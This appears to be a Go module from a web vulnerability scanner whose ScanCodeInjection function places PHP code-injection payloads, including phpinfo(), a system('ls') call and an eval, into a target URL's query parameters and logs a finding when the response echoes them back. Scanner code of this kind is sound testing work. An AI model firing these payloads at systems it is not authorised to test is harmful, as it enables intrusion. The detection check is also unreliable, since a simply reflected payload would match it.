package modules

import (
	"context"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strings"
)

func (x *XSSScanner) ScanCodeInjection(ctx context.Context, targetURL string) {
	u, err := url.Parse(targetURL)
	if err != nil {
		log.Printf("Error parsing URL: %v", err)
		return
	}

	payloads := []string{
		"phpinfo();",
		"system('ls');",
		"eval('echo \"hello\"');",
	}

	for key := range u.Query() {
		originalValue := u.Query().Get(key)
		for _, payload := range payloads {
			q := u.Query()
			q.Set(key, payload)
			u.RawQuery = q.Encode()
			req, _ := http.NewRequestWithContext(ctx, "GET", u.String(), nil)
			resp, err := x.client.Do(req)
			if err != nil {
				log.Printf("Error sending request: %v", err)
				continue
			}
			body, _ := ioutil.ReadAll(resp.Body)
			if strings.Contains(string(body), "phpinfo") || strings.Contains(string(body), "hello") {
				log.Printf("Code injection found in parameter '%s' with payload '%s'", key, payload)
			}
		}
		q := u.Query()
		q.Set(key, originalValue)
		u.RawQuery = q.Encode()
	}
}
